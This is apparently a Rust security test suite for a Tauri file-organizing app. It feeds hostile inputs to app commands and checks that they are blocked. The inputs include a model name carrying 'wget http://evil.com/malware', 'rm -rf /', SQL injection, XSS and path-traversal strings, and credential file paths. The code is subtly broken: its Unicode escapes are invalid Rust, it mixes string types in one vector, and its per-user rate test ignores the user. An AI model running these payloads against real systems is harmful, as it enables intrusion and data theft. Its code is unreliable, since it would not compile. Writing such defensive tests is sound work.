use stratosort::commands::*;
use stratosort::state::AppState;
use stratosort::config::Config;
use stratosort::error::AppError;
use tauri::{State, test::{mock_app, MockRuntime}};
use std::sync::Arc;
use tempfile::tempdir;

// Helper to create test app state
async fn create_test_state() -> Arc<AppState> {
    let app = mock_app();
    let config = Config::default();
    
    match AppState::new(app.clone(), config).await {
        Ok(state) => Arc::new(state),
        Err(_) => panic!("Could not create app state for testing"),
    }
}

#[tokio::test]
async fn test_sensitive_command_authorization() {
    let state = create_test_state().await;
    let state_ref = State::<Arc<AppState>>::from(state.clone());
    let app = mock_app();
    
    // Test commands that should require proper authorization
    let sensitive_commands = vec![
        // System-level commands
        ("force_shutdown", "Should require admin privileges"),
        ("clear_all_data", "Should require confirmation and auth"),
        ("reset_database", "Should require strong confirmation"),
        ("export_all_data", "Should validate export permissions"),
        
        // File system access commands
        ("scan_directory", "Should validate directory access rights"),
        ("analyze_files", "Should check file access permissions"),
        ("move_files", "Should verify write permissions"),
        ("delete_files", "Should require explicit permission"),
        
        // Configuration commands
        ("update_setting", "Should validate setting modification rights"),
        ("import_settings", "Should verify settings import authority"),
        ("reset_settings", "Should require reset authorization"),
        
        // AI model commands  
        ("pull_model", "Should validate model download permissions"),
        ("delete_model", "Should require model management rights"),
    ];
    
    for (command, description) in sensitive_commands {
        println!("Testing authorization for: {} - {}", command, description);
        
        // Test each command with various authorization scenarios
        match command {
            "force_shutdown" => {
                let result = system::force_shutdown(state_ref.clone()).await;
                match result {
                    Ok(_) => println!("Force shutdown allowed (check if proper auth was verified)"),
                    Err(AppError::PermissionDenied { .. }) => println!("Force shutdown properly denied"),
                    Err(e) => println!("Force shutdown failed with: {:?}", e),
                }
            }
            
            "scan_directory" => {
                // Test with system directories (should be blocked)
                let system_dirs = vec!["/etc", "/root", "C:\\Windows", "C:\\System32"];
                
                for sys_dir in system_dirs {
                    let result = files::scan_directory(sys_dir.to_string(), state_ref.clone(), app.clone()).await;
                    match result {
                        Ok(_) => println!("WARNING: System directory '{}' scan was allowed", sys_dir),
                        Err(AppError::PermissionDenied { .. }) | 
                        Err(AppError::SecurityError { .. }) => {
                            println!("System directory '{}' properly protected", sys_dir);
                        }
                        Err(e) => println!("System directory '{}' scan failed: {:?}", sys_dir, e),
                    }
                }
            }
            
            "analyze_files" => {
                // Test with protected file paths
                let protected_files = vec![
                    "/etc/passwd".to_string(),
                    "/etc/shadow".to_string(), 
                    "C:\\Windows\\System32\\config\\SAM".to_string(),
                    "/root/.ssh/id_rsa".to_string(),
                    "~/.aws/credentials".to_string(),
                ];
                
                let result = files::analyze_files(protected_files.clone(), state_ref.clone(), app.clone()).await;
                match result {
                    Ok(_) => println!("WARNING: Protected files analysis was allowed"),
                    Err(AppError::PermissionDenied { .. }) | 
                    Err(AppError::SecurityError { .. }) => {
                        println!("Protected files properly blocked from analysis");
                    }
                    Err(e) => println!("Protected files analysis failed: {:?}", e),
                }
            }
            
            "update_setting" => {
                // Test updating sensitive settings
                let sensitive_settings = vec![
                    ("database_path", "../../../etc/passwd"),
                    ("ollama_host", "http://malicious-server.com"),
                    ("max_file_size", "999999999999999999"), // Extremely large
                    ("debug_mode", "'; DROP TABLE settings; --"), // SQL injection
                ];
                
                for (key, value) in sensitive_settings {
                    let json_value = serde_json::Value::String(value.to_string());
                    let result = settings::update_setting(key.to_string(), json_value, state_ref.clone()).await;
                    
                    match result {
                        Ok(_) => println!("WARNING: Sensitive setting '{}' update was allowed", key),
                        Err(AppError::InvalidInput { .. }) | 
                        Err(AppError::SecurityError { .. }) => {
                            println!("Sensitive setting '{}' update properly blocked", key);
                        }
                        Err(e) => println!("Sensitive setting '{}' update failed: {:?}", key, e),
                    }
                }
            }
            
            "pull_model" => {
                // Test pulling models with suspicious names
                let suspicious_models = vec![
                    "../../malicious-model",
                    "model; wget http://evil.com/malware",
                    "model && rm -rf /",
                    "model`evil_command`",
                ];
                
                for model in suspicious_models {
                    let result = ai::pull_model(model.to_string(), state_ref.clone()).await;
                    match result {
                        Ok(_) => println!("WARNING: Suspicious model '{}' pull was allowed", model),
                        Err(AppError::SecurityError { .. }) | 
                        Err(AppError::InvalidInput { .. }) => {
                            println!("Suspicious model '{}' properly blocked", model);
                        }
                        Err(e) => println!("Suspicious model '{}' pull failed: {:?}", model, e),
                    }
                }
            }
            
            _ => {
                println!("Authorization test for '{}' not implemented", command);
            }
        }
    }
}

#[tokio::test]
async fn test_permission_escalation_prevention() {
    let state = create_test_state().await;
    let state_ref = State::<Arc<AppState>>::from(state.clone());
    let app = mock_app();
    
    // Test attempts to escalate permissions through various means
    let escalation_attempts = vec![
        // Path traversal to access privileged files
        ("../../../root/.bashrc", "Attempt to access root's shell config"),
        ("../../../etc/sudoers", "Attempt to access sudo configuration"),
        ("/proc/1/environ", "Attempt to access init process environment"),
        
        // Command injection attempts
        ("file.txt; sudo su", "Command injection to escalate privileges"),
        ("file.txt && sudo -i", "Command chaining for privilege escalation"),
        ("file.txt`sudo whoami`", "Backtick injection for privilege check"),
        
        // Environment variable manipulation
        ("$HOME/../../../root", "Environment variable path traversal"),
        ("${PATH}/../../etc", "Complex environment variable manipulation"),
    ];
    
    for (malicious_input, description) in escalation_attempts {
        println!("Testing escalation prevention: {}", description);
        
        // Test with file access commands
        let file_result = files::get_file_content(malicious_input.to_string(), state_ref.clone(), app.clone()).await;
        match file_result {
            Ok(_) => println!("WARNING: Escalation attempt '{}' succeeded in file access", malicious_input),
            Err(AppError::SecurityError { .. }) | 
            Err(AppError::InvalidPath { .. }) | 
            Err(AppError::PermissionDenied { .. }) => {
                println!("Escalation attempt '{}' properly blocked in file access", malicious_input);
            }
            Err(e) => println!("Escalation attempt '{}' failed: {:?}", malicious_input, e),
        }
        
        // Test with directory scanning
        let dir_result = files::scan_directory(malicious_input.to_string(), state_ref.clone(), app.clone()).await;
        match dir_result {
            Ok(_) => println!("WARNING: Escalation attempt '{}' succeeded in directory scan", malicious_input),
            Err(AppError::SecurityError { .. }) | 
            Err(AppError::InvalidPath { .. }) | 
            Err(AppError::PermissionDenied { .. }) => {
                println!("Escalation attempt '{}' properly blocked in directory scan", malicious_input);
            }
            Err(e) => println!("Escalation attempt '{}' failed: {:?}", malicious_input, e),
        }
    }
}

#[tokio::test]
async fn test_resource_access_boundaries() {
    let state = create_test_state().await;
    let state_ref = State::<Arc<AppState>>::from(state.clone());
    let app = mock_app();
    
    // Test access to various system resources
    let resource_tests = vec![
        // Network resources
        ("http://internal-server/admin", "Internal network access"),
        ("file://localhost/etc/passwd", "Local file via file:// protocol"),
        ("ftp://internal.company.com/secrets", "Internal FTP access"),
        
        // System devices
        ("/dev/mem", "Direct memory device access"),
        ("/dev/kmsg", "Kernel message access"),
        ("//./PhysicalDrive0", "Windows physical drive access"),
        ("\\\\.\\pipe\\lsass", "Windows named pipe access"),
        
        // Process information
        ("/proc/self/environ", "Process environment access"),
        ("/proc/self/cmdline", "Process command line access"),
        ("/proc/1/root", "Root process access"),
        
        // Registry (Windows)
        ("HKEY_LOCAL_MACHINE\\SAM", "Windows registry access"),
        ("HKEY_USERS\\.DEFAULT", "Windows user registry access"),
    ];
    
    for (resource_path, description) in resource_tests {
        println!("Testing resource boundary: {}", description);
        
        let access_result = files::get_file_content(resource_path.to_string(), state_ref.clone(), app.clone()).await;
        match access_result {
            Ok(_) => {
                println!("WARNING: System resource '{}' was accessible", resource_path);
            }
            Err(AppError::SecurityError { .. }) | 
            Err(AppError::InvalidPath { .. }) | 
            Err(AppError::PermissionDenied { .. }) => {
                println!("System resource '{}' properly protected", resource_path);
            }
            Err(e) => {
                println!("System resource '{}' access failed: {:?}", resource_path, e);
            }
        }
    }
}

#[tokio::test]
async fn test_command_rate_limiting_per_user() {
    let state = create_test_state().await;
    let state_ref = State::<Arc<AppState>>::from(state.clone());
    
    // Simulate different user contexts (in real app, this would use actual user sessions)
    let user_contexts = vec!["user1", "user2", "admin"];
    
    for user_context in user_contexts {
        println!("Testing rate limiting for user context: {}", user_context);
        
        // Perform rapid-fire requests
        let rapid_requests = 50;
        let start_time = std::time::Instant::now();
        
        let tasks: Vec<_> = (0..rapid_requests).map(|i| {
            let state_clone = state_ref.clone();
            let user = user_context.to_string();
            
            tokio::spawn(async move {
                // Use a lightweight command for rate limiting test
                let result = monitoring::get_enabled_features(state_clone).await;
                (i, user, result.is_ok())
            })
        }).collect();
        
        let results = futures::future::join_all(tasks).await;
        let elapsed = start_time.elapsed();
        
        let successful_requests: Vec<_> = results.into_iter()
            .filter_map(|r| r.ok())
            .filter(|(_, _, success)| *success)
            .collect();
        
        println!("User '{}': {}/{} requests succeeded in {:?}", 
                user_context, successful_requests.len(), rapid_requests, elapsed);
        
        // Check if rate limiting is working
        if successful_requests.len() < rapid_requests {
            println!("Rate limiting appears active for user '{}' ({} throttled)", 
                    user_context, rapid_requests - successful_requests.len());
        } else {
            println!("No apparent rate limiting for user '{}'", user_context);
        }
        
        // Wait between users to reset any rate limits
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }
}

#[tokio::test]
async fn test_session_management_security() {
    let state = create_test_state().await;
    let state_ref = State::<Arc<AppState>>::from(state.clone());
    
    // Test session-related security measures
    println!("Testing session management security");
    
    // Test multiple concurrent sessions
    let concurrent_sessions = 10;
    let session_tasks: Vec<_> = (0..concurrent_sessions).map(|session_id| {
        let state_clone = state_ref.clone();
        
        tokio::spawn(async move {
            // Simulate session-based operations
            let operations = vec![
                monitoring::get_system_info(state_clone.clone()).await.map(|_| "system_info"),
                monitoring::get_app_info(state_clone.clone()).await.map(|_| "app_info"),
                monitoring::get_database_stats(state_clone.clone()).await.map(|_| "db_stats"),
            ];
            
            let successful_ops = operations.into_iter()
                .filter_map(|op| op.ok())
                .count();
            
            (session_id, successful_ops)
        })
    }).collect();
    
    let session_results = futures::future::join_all(session_tasks).await;
    
    for result in session_results {
        match result {
            Ok((session_id, successful_ops)) => {
                println!("Session {}: {} operations succeeded", session_id, successful_ops);
            }
            Err(e) => {
                println!("Session failed: {:?}", e);
            }
        }
    }
    
    // Test session cleanup and resource management
    let cleanup_result = monitoring::get_system_info(state_ref.clone()).await;
    match cleanup_result {
        Ok(_) => println!("System remains responsive after concurrent sessions"),
        Err(e) => println!("System may have resource issues after sessions: {:?}", e),
    }
}

#[tokio::test]
async fn test_command_input_sanitization() {
    let state = create_test_state().await;
    let state_ref = State::<Arc<AppState>>::from(state.clone());
    
    // Test various forms of malicious input across different command parameters
    let malicious_inputs = vec![
        // SQL injection variants
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO admin VALUES('hacker'); --",
        "' UNION SELECT * FROM sensitive_data --",
        
        // Command injection variants
        "; rm -rf /",
        "&& evil_command",
        "| malicious_script",
        "`dangerous_command`",
        "$(evil_command)",
        
        // XSS variants
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        
        // Path traversal variants
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//etc//passwd",
        
        // Encoding variants
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded ../../../etc/passwd
        "\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd", // Unicode encoded
        
        // Null byte injection
        "innocent\0malicious",
        "file.txt\0.exe",
        
        // Buffer overflow attempts
        "A".repeat(10000),
        "A".repeat(100000),
        
        // Format string attacks
        "%s%s%s%s%s",
        "%x%x%x%x%x",
        "%n%n%n%n%n",
    ];
    
    for malicious_input in malicious_inputs {
        println!("Testing input sanitization with: {}", 
                malicious_input.chars().take(50).collect::<String>());
        
        // Test with different command types that take string parameters
        
        // Test with AI commands
        let ai_result = ai::analyze_with_ai(
            malicious_input.clone(),
            "text/plain".to_string(),
            state_ref.clone()
        ).await;
        
        match ai_result {
            Ok(_) => println!("AI command processed malicious input (check if sanitized)"),
            Err(AppError::SecurityError { .. }) | 
            Err(AppError::InvalidInput { .. }) => {
                println!("AI command properly rejected malicious input");
            }
            Err(e) => println!("AI command failed with: {:?}", e),
        }
        
        // Test with settings commands
        let settings_result = settings::update_setting(
            "test_key".to_string(),
            serde_json::Value::String(malicious_input.clone()),
            state_ref.clone()
        ).await;
        
        match settings_result {
            Ok(_) => println!("Settings command processed malicious input (check if sanitized)"),
            Err(AppError::SecurityError { .. }) | 
            Err(AppError::InvalidInput { .. }) => {
                println!("Settings command properly rejected malicious input");
            }
            Err(e) => println!("Settings command failed with: {:?}", e),
        }
        
        // Test with search commands (if available)
        let search_result = ai::semantic_search(
            malicious_input.clone(),
            10,
            state_ref.clone()
        ).await;
        
        match search_result {
            Ok(results) => {
                println!("Search command processed malicious input, returned {} results", results.len());
                // Verify results don't contain evidence of successful injection
                for result in results {
                    assert!(!result.path.contains("DROP TABLE"), "Results should not show SQL injection success");
                    assert!(!result.content.contains("<script>"), "Results should not contain XSS payloads");
                }
            }
            Err(AppError::SecurityError { .. }) | 
            Err(AppError::InvalidInput { .. }) => {
                println!("Search command properly rejected malicious input");
            }
            Err(e) => println!("Search command failed with: {:?}", e),
        }
    }
}